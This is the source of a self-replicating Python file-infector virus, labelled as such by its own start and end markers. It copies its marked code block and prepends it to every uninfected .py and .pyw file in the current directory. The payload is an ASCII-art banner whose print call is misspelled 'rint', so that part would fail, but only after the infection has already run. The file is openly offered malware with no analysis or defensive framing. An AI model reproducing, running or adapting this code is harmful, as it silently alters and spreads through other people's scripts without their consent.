### START OF VIRUS ###

import sys, glob
code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virus_area = False
for line in lines:
    if line == '### START OF VIRUS ###\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '### END OF VIRUS ###\n':
        break

python_scripts = glob.glob('*.py') + glob.glob('*.pyw')

for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readlines()

    infected = False
    for line in script_code:
        if line == '### END OF VIRUS ###\n':
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)

        with open(script, 'w') as f:
            f.writelines(final_code)

rint("""
        ymmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmMMm
        hMmmmmmmmmmmmmmmmmmmmmmmmmmMMMMMMMMMMMMNNmmmmmNMMMMMMMMMMMMMMMNmmmmmmmmmmmmmmmmmmmmmmmMMm
        hM                                 `.-:/++ooooo++/:-.`                                MMm 
        hM                          `:+shmNNNMMMMMMMMMMMMMNNNmhs/-`                           MMm   
        hM                      ./sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNho:.                       MMm   
        hM                   -odNMMMMMMMMMMMMNmdddmmmNMMMMMMMMMMMMMMMMNh+.                    MMm   
        hM                .+dNMMMMMMMMMMMMMMh.`.--:////+osyhdNMMMMMMMMMMMNh/.  `              MMm   
        hM              -ymMMMMMMMMMMMMMMMMMM`       ``...:://yydNMMMMMMMMMMms.`..`           MMm   
        hM            -yNMMMMMMMMMMMMMMMMMMMs---::-----.`    /..--omMMMMMMMMMMNy-`::`         MMm   
        hM          .yNMMMMMMMMMNNmmmmddddhy-.....--...-:::-/-    `oMMMMMMMMMMMMNs..+:        MMm   
        hM        `oNMMMMMMMMMMMs+/::::::://---:::--::::-..-:/+-..dMMMMMMMMMMMMMMMm/`/s.      MMm   
        hM       `hMMMMMMMMMMMMMMNdho/:..`+.``...-:++/+::::-:/:`.oMMMMMMMMMMMMMMMMMMo`-h:     MMm   
        hM      :dMMMMMMMMMMMMMMMMMMMMMNmd-``:///:/.- o`:--:://--+hmMMMMMMMMMMMMMMMMMd.`yo`   MMm   
        hM     /NMMMMMMMMMMMMMMMMMMMMMMmd+/:so..+s`   /-`  .  s...-:/ymNMMMMMMMMMMMMMMm-`yy`  MMm   
        hM    /NMMMMMMMMMMMMMMMMMMNmdo+./ - +o..o+    ::   :`-/:- ..---/oNMMMMMMMMMMMMMm-`hh` MMm   
        hM   -NMMMMMMMMMMMMMMMMNdoo.:`.     `-//-   `:/   `/ -:MdsdNmmdddNMMMMMMMMMMMMMMm``my`MMm   
        hM  .mMMMMMMMMMMMMMMNho./ .  ` `` . `` `    o. . -/`/`NMmNMMmMMMMMMMMMMMMMMMMMMMMh :MsMMm   
        hM  hMMMMMMMMMMMMMMh+ : -`-:.o:++/s/++-/`/`/-`-.o::+..MMmNMMMMMMMMMMMMMMMMMMMMMMMM+ sMMMm   
        hh :MMMMMMMMMMMMMN+`: +-+/++:.oyy/`` `.-/+/:.: oos+..oMMddMMMMMMMMMMMMMMMMMMMMMMMMN`.NMMm   
        h: hMMMMMMMMMMMMm-`:oohhmMMMdhMMMMNd+---://:-.oo+:.---yNNNMMMMMMMMMMMMMMMMMMMMMMMMM+ yMMm   
        y .MMMMMMMMMMMMN/odmMMMMMMMMNdMMMMMMMmo--..-:-o. `::::/hMMMMMMMMMMMMMMMMMMMMMMMMMMMd :MMm   
        / +MMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMh-        `+:.`//yNMMMMMMMMMMMMMMMMMMMMMMMMMMMMM` NMm   
        . sMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM/-         oydmmMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM- mMm   
        . yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmMydho`-m/dddMNmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM/ hMm   
          hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMdMMMsNMMMhdMMmmMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM/ hMm   
        . yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmMMMdMMMMMhMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM: dMm   
        - sMMMMMMNooooooooooymMMMMNooooooooooooomMMyMMNhshMMmoooooooNMMmomMMMMMNhsNMMMMMMMMM. NMm   
        + /MMMMMMMy+y:yyyyys/`+MMMh /y/yyoyyyyoyNMMmm+.-oNMMs +yoysyMMMs yMMMm+`.oNMMMMMMMMN .MMm   
        y `MMMMMMMMdMdMMMMMMMo yMMh oMdMMmMMMMdMMMMm`-dsMMMMs yMdmdMMMMs yMMm`-hhMMMMMMMMMMs +MMm   
        h/ yMMMMMMMMMhMMMMMMM+ hMMh oMdMMhMMMMdMMMMm :NsMMMMs yMhMMMMMMs yMMm`:NdMMMMMMMMMM- mMMm   
        hd -MMMMMNsoooooooo+-.sMMMh oMsMMNMMMNdMMMMMo.-mMMMMs yMhMMMMMMs yMMMh.-dMMMMMMMMMy /MMMm   
        hM: oMMMMd :sssssssshhMMMMh :o:ooo+omNhMMMMMMm-.hMMMs yMMMMMMMMs yMMMMd..hMMMMMMMN.`mMMMm   
        hM:.`dMMMd +MMMMMMMNmMMMMMh :yyyyyysNMmMMMMMMMN:`mMMs yMMMMMMMMs yMMMMNd:`mMMMMMM: yMMMMm   
        hM o`.mMMd +MMMMMMMNNMMMMMh oMMMMMMmMMMMMMMMMMd-`mMMs yMMMMMMMMs yMMMMMd-`mMMMMM+ +MMMMMm   
        hM .y`-mMd +MMMMMMMMMMMMMMh :oooooooooosNMMNo--+mMMMs yMMMMMMMMs yMMNo--+mMMMMMo /MMMsMMm   
        hM  :y`-mNsmMMMMMMMMMMMMMMNsssssssssssssNMMNohmMMMMMmoNMMMMMMMMhsNMMNohmMMMMMNo /NMMy MMm   
        hM   /h..hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMhNMMMMMMMMMMMm:`oMMMh` MMm   
        hM    /d:`oNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMh..yMMMy`  MMm   
        hM     :do`:dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm+`:mMMNo`   MMm   
        hM      .hd:`+mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNs..yMMMm/     MMm   
        hM        +mh-.+mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNs-.oNMMNy.      MMm   
        hM         .yNy:./dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmo..sNMMMd:        MMm   
        hM           -yNd/.-omNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMms:.:yNMMMd/          MMm   
        hM             -yNNy:.-odNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNds:.-smMMMNd/            MMm   
        hM               .+dNNy+..:ohNNMMMMMMMMMMMMMMMMMMMMMMMMNNds/../smMMMMms-              MMm      
        hM                  -omNMmy+-`-:+sydmNNNNNNNNNNNNmdhs+/-`-+sdMMMMMmy:                 MMm      
        hM                     -+yNMMMmhso/:.``....--..``.-:+sydNMMMMMNho:`                   MMm      
        hMmmmmmmmmmmmmmmmmmmmmmmmmmMMMMMMMMMMMMNNmmmmmNMMMMMMMMMMMMMMMNmmmmmmmmmmmmmmmmmmmmmmmMMm      
        ymmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmMMm   """)

### END OF VIRUS ###
